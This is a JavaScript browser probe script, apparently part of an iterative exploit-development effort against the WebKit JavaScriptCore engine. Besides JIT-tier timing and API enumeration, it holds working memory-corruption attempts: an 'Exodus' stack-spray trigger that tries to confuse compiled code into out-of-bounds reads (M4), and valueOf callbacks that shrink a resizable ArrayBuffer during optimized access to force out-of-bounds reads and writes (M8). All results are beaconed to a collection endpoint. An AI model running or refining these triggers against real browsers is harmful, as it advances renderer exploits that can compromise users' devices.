/* p109 — Definitive JIT tier detection + Exodus OOB write + API surface
 *
 * M1: Tight loop throughput — LLInt ~50ms/10M, Baseline ~15ms, DFG ~3ms
 * M2: OSR exit spike — type switch after warmup, DFG shows spike
 * M3: IC monomorphic→polymorphic timing difference
 * M4: Correct Exodus trigger — structure size mismatch OOB write
 * M5: API surface enumeration (history, MessageChannel, Canvas, SVG, etc)
 * M6: structuredClone edge cases
 * M7: MutationObserver / CustomElements / Range
 * M8: valueOf-during-resize (DeepSeek pattern)
 *
 * Beacon prefix: V109M-
 */
(function(){
var RUN_ID = "v109m" + Math.random().toString(36).slice(2,12);
var PREFIX = "V109M-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press109-jitdetect");

/* ====== M1: Tight loop throughput benchmark ====== */
function test_M1() {
  var r = {};
  try {
    // Test 1: Simple add loop — 10M iterations
    var x = 0;
    var t0 = performance.now();
    for (var i = 0; i < 10000000; i++) {
      x = x + 1;
    }
    var t1 = performance.now();
    r.addMs = Math.round((t1 - t0) * 100) / 100;
    r.addResult = x;

    // Test 2: Multiply + branch — 10M iterations
    var y = 1;
    var t2 = performance.now();
    for (var i = 0; i < 10000000; i++) {
      y = (y * 3 + 1) | 0;
      if (y > 1000000) y = y - 999999;
    }
    var t3 = performance.now();
    r.mulMs = Math.round((t3 - t2) * 100) / 100;

    // Test 3: Property access loop — 5M iterations
    var obj = {a: 1, b: 2, c: 3};
    var z = 0;
    var t4 = performance.now();
    for (var i = 0; i < 5000000; i++) {
      z += obj.a;
    }
    var t5 = performance.now();
    r.propMs = Math.round((t5 - t4) * 100) / 100;

    // Test 4: Function call loop — 5M iterations
    function inc(v) { return v + 1; }
    var w = 0;
    var t6 = performance.now();
    for (var i = 0; i < 5000000; i++) {
      w = inc(w);
    }
    var t7 = performance.now();
    r.callMs = Math.round((t7 - t6) * 100) / 100;

    // Interpretation:
    // LLInt: addMs > 40, propMs > 30, callMs > 40
    // Baseline: addMs 10-30, propMs 5-15, callMs 10-25
    // DFG: addMs < 10, propMs < 5, callMs < 10
    if (r.addMs < 10) r.TIER_GUESS = "DFG";
    else if (r.addMs < 35) r.TIER_GUESS = "Baseline";
    else r.TIER_GUESS = "LLInt";

    r.SURVIVED = true;
    B("M1-THROUGHPUT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M1-ERR", r); }
}

/* ====== M2: OSR exit detection ====== */
function test_M2() {
  var r = {};
  try {
    function poly(x) {
      return x.val + 1;
    }

    var intObj = {val: 42};
    var strObj = {val: "hello"};

    // Warmup with int — should compile for int speculation
    for (var i = 0; i < 100000; i++) {
      poly(intObj);
    }
    r.warmupDone = true;

    // Measure int path (should be fast)
    var t0 = performance.now();
    for (var i = 0; i < 100000; i++) {
      poly(intObj);
    }
    var t1 = performance.now();
    r.intMs = Math.round((t1 - t0) * 1000) / 1000;

    // NOW switch type — first call triggers OSR exit in DFG
    var t2 = performance.now();
    poly(strObj); // This single call triggers the exit
    var t3 = performance.now();
    r.switchUs = Math.round((t3 - t2) * 1000); // microseconds

    // Measure again with mixed types
    var t4 = performance.now();
    for (var i = 0; i < 100000; i++) {
      poly(i % 2 ? intObj : strObj);
    }
    var t5 = performance.now();
    r.mixedMs = Math.round((t5 - t4) * 1000) / 1000;

    // In DFG: intMs << mixedMs, switchUs is a spike
    // In LLInt: intMs ≈ mixedMs, switchUs is normal
    r.ratio = Math.round((r.mixedMs / (r.intMs || 0.001)) * 100) / 100;

    if (r.ratio > 2.0) r.OSR_DETECTED = true;

    r.SURVIVED = true;
    B("M2-OSREXIT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M2-ERR", r); }
}

/* ====== M3: IC transition timing ====== */
function test_M3() {
  var r = {};
  try {
    function readProp(o) { return o.x; }

    // Phase 1: Monomorphic warmup
    var mono = {x: 1, y: 2};
    var t0 = performance.now();
    for (var i = 0; i < 500000; i++) {
      readProp(mono);
    }
    var t1 = performance.now();
    r.monoMs = Math.round((t1 - t0) * 100) / 100;

    // Phase 2: Introduce second shape → IC goes polymorphic
    var other = {x: 1, z: 3}; // Different shape (z instead of y)
    var t2 = performance.now();
    for (var i = 0; i < 500000; i++) {
      readProp(i % 2 ? mono : other);
    }
    var t3 = performance.now();
    r.polyMs = Math.round((t3 - t2) * 100) / 100;

    r.ratio = Math.round((r.polyMs / (r.monoMs || 0.001)) * 100) / 100;
    // DFG: mono much faster than poly (compiled IC vs megamorphic)
    // LLInt: roughly equal (both do dictionary lookup)
    if (r.ratio > 1.5) r.IC_TRANSITION_DETECTED = true;

    r.SURVIVED = true;
    B("M3-ICTIMING", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M3-ERR", r); }
}

/* ====== M4: Correct Exodus OOB write — structure size mismatch ====== */
function test_M4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);

    // Small object: 2 inline slots (structureID + butterfly + 2 props = ~0x20 bytes)
    function SmallObj() { this.a = 1; this.b = 2; }
    // Large object: 6 inline slots (~0x38 bytes)
    function LargeObj() { this.a = 1; this.b = 2; this.c = 3; this.d = 4; this.e = 5; this.f = 6; }

    // stack_spray equivalent: fill stack with small objects
    function stack_spray(small) {
      var s1 = small; var s2 = small; var s3 = small; var s4 = small;
      var s5 = small; var s6 = small; var s7 = small; var s8 = small;
      return [s1, s2, s3, s4, s5, s6, s7, s8];
    }

    // trigger: compiled expecting LargeObj, receives SmallObj via stale register
    function trigger(thing, obj) {
      var l = [1,2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      var b = {}; var c = {}; var d = {};
      var e = {}; var f = {}; var g = {}; var h = {};
      intArr[0] = thing;
      // If register is clobbered, obj may point to SmallObj
      // Accessing obj.f (6th property) on a 2-property object = OOB read
      var val_a = obj.a;
      var val_b = obj.b;
      var val_c = obj.c;
      var val_d = obj.d;
      var val_e = obj.e;
      var val_f = obj.f;
      return {a: val_a, b: val_b, c: val_c, d: val_d, e: val_e, f: val_f};
    }

    var large = new LargeObj();
    var small = new SmallObj();

    // Warmup trigger with LargeObj
    for (var i = 0; i < 15000; i++) {
      trigger(i + 0.5, large);
    }
    r.triggerCompiled = true;

    // Warmup stack_spray
    for (var i = 0; i < 5000; i++) {
      stack_spray(small);
    }

    // Trigger: slow path + small object on stack
    function exploit_attempt() {
      stack_spray(small);
      return trigger(13371337133713371337.1337, large);
    }

    for (var i = 0; i < 5000; i++) {
      exploit_attempt();
    }

    var result = exploit_attempt();
    r.a = result.a;
    r.b = result.b;
    r.c = result.c;
    r.d = result.d;
    r.e = result.e;
    r.f = result.f;

    // Check: all values should be 1-6 if reading from LargeObj correctly
    var correct = (result.a === 1 && result.b === 2 && result.c === 3 &&
                   result.d === 4 && result.e === 5 && result.f === 6);
    r.allCorrect = correct;

    if (!correct) {
      r.OOB_DETECTED = true;
      // Check if any values look like they came from SmallObj or adjacent memory
      if (result.f !== 6) r.f_wrong = typeof result.f + ":" + String(result.f).slice(0,30);
      if (result.e !== 5) r.e_wrong = typeof result.e + ":" + String(result.e).slice(0,30);
    }

    r.SURVIVED = true;
    B("M4-EXODUS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M4-ERR", r); }
}

/* ====== M5: API surface enumeration ====== */
function test_M5() {
  var r = {};
  try {
    // History API
    r.historyReplace = typeof history.replaceState === 'function';
    r.historyPush = typeof history.pushState === 'function';
    try {
      history.replaceState({test: 1}, "");
      r.historyWorks = (history.state && history.state.test === 1);
    } catch(e2) { r.historyErr = e2.name; }

    // MessageChannel
    r.MessageChannel = typeof MessageChannel !== 'undefined';
    r.MessagePort = typeof MessagePort !== 'undefined';
    if (r.MessageChannel) {
      try {
        var mc = new MessageChannel();
        r.mcPort1 = typeof mc.port1;
        r.mcPort2 = typeof mc.port2;
        mc.port1.close(); mc.port2.close();
      } catch(e2) { r.mcErr = e2.name; }
    }

    // Canvas 2D
    r.canvasElem = typeof document.createElement('canvas') !== 'undefined';
    try {
      var cv = document.createElement('canvas');
      cv.width = 10; cv.height = 10;
      var ctx = cv.getContext('2d');
      r.canvas2d = ctx !== null;
      if (ctx) {
        ctx.fillRect(0, 0, 1, 1);
        var id = ctx.getImageData(0, 0, 1, 1);
        r.imageData = id.data.length === 4;
      }
    } catch(e2) { r.canvasErr = e2.name; }

    // SVG
    try {
      var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
      r.svgElement = svg.tagName === 'svg' || svg.tagName === 'SVG';
      var rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
      svg.appendChild(rect);
      r.svgRect = true;
    } catch(e2) { r.svgErr = e2.name; }

    // Custom Elements
    r.customElements = typeof customElements !== 'undefined';
    if (r.customElements) {
      try {
        r.ceDefine = typeof customElements.define === 'function';
      } catch(e2) { r.ceErr = e2.name; }
    }

    // Shadow DOM
    try {
      var div = document.createElement('div');
      var shadow = div.attachShadow({mode: 'open'});
      r.shadowDOM = shadow !== null && shadow !== undefined;
    } catch(e2) { r.shadowErr = e2.name; }

    // MutationObserver
    r.MutationObserver = typeof MutationObserver !== 'undefined';

    // Range API
    r.Range = typeof Range !== 'undefined';
    try {
      var range = document.createRange();
      r.rangeWorks = typeof range.setStart === 'function';
    } catch(e2) { r.rangeErr = e2.name; }

    // Selection API
    r.Selection = typeof window.getSelection === 'function';

    // CSS Animations
    r.cssAnim = typeof document.createElement('div').animate === 'function';

    // Intersection/Resize Observer
    r.IntersectionObserver = typeof IntersectionObserver !== 'undefined';
    r.ResizeObserver = typeof ResizeObserver !== 'undefined';

    // requestAnimationFrame
    r.rAF = typeof requestAnimationFrame === 'function';

    // Performance API
    r.perfNow = typeof performance.now === 'function';
    r.perfMark = typeof performance.mark === 'function';

    r.SURVIVED = true;
    B("M5-APIS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M5-ERR", r); }
}

/* ====== M6: structuredClone edge cases ====== */
function test_M6() {
  var r = {};
  try {
    r.hasStructuredClone = typeof structuredClone === 'function';

    if (r.hasStructuredClone) {
      // Test 1: Circular reference
      var circ = {a: 1};
      circ.self = circ;
      try {
        var c1 = structuredClone(circ);
        r.circular = (c1.self === c1 && c1.a === 1);
      } catch(e2) { r.circErr = e2.name; }

      // Test 2: Shared reference (duplicate object)
      var shared = {x: 42};
      var graph = {a: shared, b: shared};
      try {
        var c2 = structuredClone(graph);
        r.sharedRef = (c2.a === c2.b); // Should be same ref after clone
        r.sharedVal = c2.a.x;
      } catch(e2) { r.sharedErr = e2.name; }

      // Test 3: TypedArray in graph
      var buf = new ArrayBuffer(16);
      var u8 = new Uint8Array(buf);
      u8[0] = 0xAA; u8[1] = 0xBB;
      try {
        var c3 = structuredClone({arr: u8, buf: buf});
        r.taClone = c3.arr[0] === 0xAA;
        r.taSeparate = (c3.arr.buffer !== c3.buf); // Should be separate after clone
      } catch(e2) { r.taErr = e2.name; }

      // Test 4: Transfer ArrayBuffer
      try {
        var tbuf = new ArrayBuffer(8);
        new Uint8Array(tbuf)[0] = 0xFF;
        var c4 = structuredClone({x: tbuf}, {transfer: [tbuf]});
        r.transfer = (tbuf.byteLength === 0); // Original detached
        r.transferVal = new Uint8Array(c4.x)[0];
      } catch(e2) { r.transferErr = e2.name; }

      // Test 5: Map/Set
      try {
        var m = new Map([[1, "a"], [2, "b"]]);
        var s = new Set([1, 2, 3]);
        var c5 = structuredClone({m: m, s: s});
        r.mapClone = c5.m.get(1) === "a";
        r.setClone = c5.s.has(3);
      } catch(e2) { r.mapSetErr = e2.name; }

      // Test 6: Deep nesting (100 levels)
      try {
        var deep = {v: 0};
        var cur = deep;
        for (var i = 1; i < 100; i++) {
          cur.child = {v: i};
          cur = cur.child;
        }
        var c6 = structuredClone(deep);
        var d = c6;
        var depth = 0;
        while (d && d.child) { d = d.child; depth++; }
        r.deepNest = depth;
      } catch(e2) { r.deepErr = e2.name; }
    }

    // Test history.replaceState with complex graph
    try {
      var shared2 = {val: 777};
      var stateObj = {ref1: shared2, ref2: shared2, arr: new Uint8Array([1,2,3])};
      history.replaceState(stateObj, "");
      var restored = history.state;
      r.histShared = (restored && restored.ref1 === restored.ref2);
      r.histVal = restored && restored.ref1 && restored.ref1.val;
      r.histArr = restored && restored.arr && restored.arr[0];
      r.histArrType = restored && restored.arr && restored.arr.constructor.name;
    } catch(e2) { r.histStateErr = e2.name + ":" + e2.message.slice(0,60); }

    r.SURVIVED = true;
    B("M6-STRUCTCLONE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M6-ERR", r); }
}

/* ====== M7: MutationObserver + Range + DOM mutation ====== */
function test_M7() {
  var r = {};
  try {
    // MutationObserver basic
    if (typeof MutationObserver !== 'undefined') {
      var mutCount = 0;
      var obs = new MutationObserver(function(mutations) {
        mutCount += mutations.length;
      });
      var target = document.createElement('div');
      document.body.appendChild(target);
      obs.observe(target, {childList: true, subtree: true});

      // Mutate
      target.innerHTML = '<span>a</span><span>b</span>';
      target.firstChild.remove();
      target.innerHTML = '';

      // Force microtask
      setTimeout(function() {
        obs.disconnect();
        r.mutObserver = true;
        r.mutCount = mutCount;

        // Range test
        try {
          var container = document.createElement('div');
          container.innerHTML = 'Hello World Test';
          document.body.appendChild(container);
          var range = document.createRange();
          range.setStart(container.firstChild, 0);
          range.setEnd(container.firstChild, 5);
          r.rangeStr = range.toString();
          r.rangeCollapsed = range.collapsed;

          // Delete range contents
          range.deleteContents();
          r.afterDelete = container.textContent;

          // adoptNode across documents
          try {
            var parser = new DOMParser();
            var doc2 = parser.parseFromString('<div id="d2">cross</div>', 'text/html');
            var adopted = document.adoptNode(doc2.getElementById('d2'));
            r.adoptNode = adopted.textContent;
            r.adoptOwner = (adopted.ownerDocument === document);
          } catch(e3) { r.adoptErr = e3.name; }

          container.remove();
        } catch(e3) { r.rangeErr2 = e3.name; }

        target.remove();
        r.SURVIVED = true;
        B("M7-DOMAPIS", r);
      }, 100);
    } else {
      r.mutObserver = false;
      r.SURVIVED = true;
      B("M7-DOMAPIS", r);
    }
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M7-ERR", r); }
}

/* ====== M8: valueOf during resize — DeepSeek pattern ====== */
function test_M8() {
  var r = {};
  try {
    var rab = new ArrayBuffer(16, {maxByteLength: 32});
    var ta = new Int32Array(rab);
    ta[0] = 111; ta[1] = 222; ta[2] = 333; ta[3] = 444;
    r.initialLen = ta.length;

    // Pattern 1: valueOf on INDEX resizes buffer
    function opt_idx(arr, idx) {
      return arr[idx];
    }

    // Warmup
    for (var i = 0; i < 100000; i++) {
      opt_idx(ta, 0);
    }

    var evilIdx = {
      valueOf: function() {
        rab.resize(4); // Shrink to 4 bytes (1 int32 element)
        return 3; // Access index 3 — now OOB!
      }
    };

    var readResult;
    try {
      readResult = opt_idx(ta, evilIdx);
      r.idxRead = String(readResult);
      r.idxType = typeof readResult;
      r.afterIdxLen = ta.length;
      r.afterIdxBuf = rab.byteLength;
      if (readResult !== undefined && readResult !== 444) {
        r.IDX_OOB = true;
      }
    } catch(e2) { r.idxErr = e2.name + ":" + e2.message.slice(0,60); }

    // Reset
    rab.resize(16);
    ta[0] = 111; ta[1] = 222; ta[2] = 333; ta[3] = 444;

    // Pattern 2: valueOf on VALUE resizes buffer during PutByVal
    function opt_put(arr, idx, val) {
      arr[idx] = val;
    }

    for (var i = 0; i < 100000; i++) {
      opt_put(ta, 0, i);
    }

    var evilVal = {
      valueOf: function() {
        rab.resize(4); // Shrink — index 3 now OOB
        return 99999;
      }
    };

    try {
      opt_put(ta, 3, evilVal);
      r.putAfterLen = ta.length;
      r.putAfterBuf = rab.byteLength;
      // Read back — if OOB write happened, adjacent memory corrupted
      r.putVal0 = ta[0];
      // Grow back to check if write went OOB
      rab.resize(16);
      r.putVal3 = ta[3];
      if (r.putVal3 === 99999) {
        r.PUT_OOB = true; // Wrote to OOB location!
      }
    } catch(e2) { r.putErr = e2.name + ":" + e2.message.slice(0,60); }

    // Pattern 3: valueOf on INDEX for PutByVal
    rab.resize(16);
    ta[0] = 111; ta[1] = 222; ta[2] = 333; ta[3] = 444;

    function opt_put2(arr, idx, val) {
      arr[idx] = val;
    }
    for (var i = 0; i < 100000; i++) {
      opt_put2(ta, 0, i);
    }

    var evilIdx2 = {
      valueOf: function() {
        rab.resize(4);
        return 3;
      }
    };

    try {
      opt_put2(ta, evilIdx2, 77777);
      rab.resize(16);
      r.put2Val3 = ta[3];
      if (r.put2Val3 === 77777) {
        r.PUT2_OOB = true;
      }
    } catch(e2) { r.put2Err = e2.name + ":" + e2.message.slice(0,60); }

    r.SURVIVED = true;
    B("M8-VALRESIZE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("M8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_M1();
  setTimeout(test_M2, 3000);
  setTimeout(test_M3, 6000);
  setTimeout(test_M4, 10000);
  setTimeout(test_M5, 15000);
  setTimeout(test_M6, 18000);
  setTimeout(test_M7, 22000);
  setTimeout(test_M8, 28000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe109-done"); }, 70000);
})();
